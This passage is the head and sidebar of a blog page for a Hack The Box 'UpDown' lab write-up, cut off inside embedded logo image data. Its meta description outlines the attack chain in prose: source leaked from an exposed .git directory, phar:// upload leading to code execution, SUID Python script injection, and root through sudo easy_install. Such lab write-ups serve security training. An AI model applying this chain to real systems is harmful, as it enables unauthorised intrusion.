@@ -1,0 +1,591 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. On the Apache server a web application is featured that allows users to check if a webpage is up. A directory named .git is identified on the server and can be downloaded to reveal the source code of the dev subdomain running on the target, which can only be accessed with a special HTTP header. Furthermore, the subdomain allows files to be uploaded, leading to remote code execution using the phar:// PHP wrapper. The Pivot consists of injecting code into a SUID Python script and obtaining a shell as the developer user, who may run easy_install with Sudo, without a password. This can be leveraged by creating a malicious python script and running easy_install on it, as the elevated privileges are not dropped, allowing us to maintain access as root."><title>HTB | Updown</title><link rel=canonical href=https://leopoldabgn.github.io/p/updown-htb/><link rel=stylesheet href=/scss/style.min.43715118627f0ddaca31ce1b7a5b384da06ff9dd2d6f578695318ea19426b0ad.css><meta property='og:title' content="HTB | Updown"><meta property='og:description' content="UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. On the Apache server a web application is featured that allows users to check if a webpage is up. A directory named .git is identified on the server and can be downloaded to reveal the source code of the dev subdomain running on the target, which can only be accessed with a special HTTP header. Furthermore, the subdomain allows files to be uploaded, leading to remote code execution using the phar:// PHP wrapper. The Pivot consists of injecting code into a SUID Python script and obtaining a shell as the developer user, who may run easy_install with Sudo, without a password. This can be leveraged by creating a malicious python script and running easy_install on it, as the elevated privileges are not dropped, allowing us to maintain access as root."><meta property='og:url' content='https://leopoldabgn.github.io/p/updown-htb/'><meta property='og:site_name' content="leopoldabgn's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Linux'><meta property='article:tag' content='Medium'><meta property='article:published_time' content='2025-10-30T00:00:00+00:00'><meta property='article:modified_time' content='2025-10-30T00:00:00+00:00'><meta name=twitter:title content="HTB | Updown"><meta name=twitter:description content="UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. On the Apache server a web application is featured that allows users to check if a webpage is up. A directory named .git is identified on the server and can be downloaded to reveal the source code of the dev subdomain running on the target, which can only be accessed with a special HTTP header. Furthermore, the subdomain allows files to be uploaded, leading to remote code execution using the phar:// PHP wrapper. The Pivot consists of injecting code into a SUID Python script and obtaining a shell as the developer user, who may run easy_install with Sudo, without a password. This can be leveraged by creating a malicious python script and running easy_install on it, as the elevated privileges are not dropped, allowing us to maintain access as root."><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><div class=site-meta><h1 class=site-name><a href=/>leopoldabgn's Blog</a></h1><h2 class=site-description>OSCP+ certified</h2></div></header><ol class=menu-social><li><a href=https://github.com/leopoldabgn target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://app.hackthebox.com/users/1676673 target=_blank title=HackTheBox rel=me><svg version="1.2" viewBox="0 0 1200 1200" width="1200" height="1200"><title>htb-logo</title><defs><image width="1024" height="1168" id="img1" href="data:image/png;base64,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PQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9BACyEQB6CABkIwD0EADIRgDoIQCQjQDQQwAgGwGghwBANgJADwGAbASAHgIA2QgAPQQAshEAeggAZCMA9BAAyEYA6CEAkI0A0EMAIBsBoIcAQDYCQA8BgGwEgB4CANkIAD0EALIRAHoIAGQjAPQQAMhGAOghAJCNANBDACAbAaCHAEA2AkAPAYBsBIAeAgDZCAA9IgGw/bP5jwABIOiPr81/RI8AmL61/xEgAPT8+0vzH9ElAC7/af8zwiMA5Ow6vMhdAuDhsf3PCI8AkHNx3f5ndAkAFgE6IADk3O7b/4wuAcA9QAcEgJrd/ab9D+kTAJv2q5nhEQBquryjfQJguu9wMRMcASCmywVArwDgeGmOABBzddnjp3QKgOnTf7r8mMAIAC13fbbOegUANwGtEQBS+twAdAyA/XcSoCkCQMnuqv0Q4ItuAUACNEYACOl2/ncMgGn/8NTrR0VEAOjY3D30+lEdA2CaHm//7vfDoiEAZPzra5/7/2ddA2C6eup1ZRMPASDi7qbnSdI3AH4cOA+sBLRBAEj43HmprHcA/Li/ueI+oAUCQMDuy2W/q/8X/QNg2j/SDm6AAPBve9Ft8e+nAQEwTVdf2A+ojgDwbnN10f+HDgmAH8fP7X9H/FhlBIBvuzGrY4MCgC3B6ggA1y573/z//LmjAmDa39IPqokAcOxi2/3m/824AJimqz1fFFQPAeDW568Dbv7fjAyAabp9YimgFgLAqd3XLsX/hLEBME0PW5YC6iAAfOo59ztjdABM+0umg6sgADzqO/c7Y3gA/DiWrlkKqIAA8OfzxfBvyzUQANO0uWYpYDUCwJvdl65v2TwTATDtH1kKWIsAcGb7OPTm/42NAGA6eD0CwJW77+O2/g5ZCQCKwmsRAI70Lv2m2QkAisLrEABu9C/9plkKAIrCaxAAXoyb+51hKgCYDl6BAPBhSOk3zVgAUBQuRgB4MKj0m2YuACgKFyIAHBhV+k0zGABMBxchAMy72xi6+X9jMQCmaXvPUsBSBIBxI0u/aTYDgKLwcgSAaWNLv2lWA4Ci8FIEgGU25n5n2A0AHiO0DAFg1/DSb5rhAKAovAgBYJWB0m/ajeUAoCi8AAFgk4nSb9q3zbXFtclfmA7ORQCYNOBhP4tYDwCKwrkIAIOslH7Tvm3+MHyD8oqicA4CwBw7pd+k7Z+bvgdOGYrC5xEA1tib+z329H2z9XCFzWOEziIAbDFV+k16fNjc+Vhloyh8BgFgibHSb9LFl81keh/wAEXhkwgAO6zO/R67328m69sAvzEdfAIBYMbgh/0s8W3adD5yVqEonEYAGGGx9Jty+9ePAHCyCPCKonAKAWCCzdJvyqf//AiA6cbNBcszisLzCAADjM/9Hrn573MA3JofV3iHxwjNIgDGM1v6Tdj+OT0HgKt7gGcUhWcQAKMZLv0m/LgDeA6A6f/8rFq8oSh8hAAYy3TpN+H679cA+Ne30b/JckwHf0AAjGTpYT/ZNs+R9fxr7+79/fIUhT8gAAayXvqdd/+8+Pdy6jsaBThAUfgQATCM/dLvrNf38CUAXF4CTBSFDxEAg5h72E+uy5d1tNcz3+clwMRjhH4jAMbwUPqddfvXy/94/e13e4/3MM8oCr8hAEbwUfqddfM6UPcWXxfXA3+VdSgKvyAA+vM19/vew9sa+s/rF/vfDJbGdPBEAPTnp/Q743kI8MXPAPB7E/CMojAB0Juj0u+M+58rl7/+CHcDwe9QFCYAuvJU+p3x6dfK2e8U8zgPeCB6UZgA6Mjj3O+hze9f/+Ayxlkr8EjsxwgRAN14K/0e2T78vmM+vI/xvBD4LHRRmADoxVv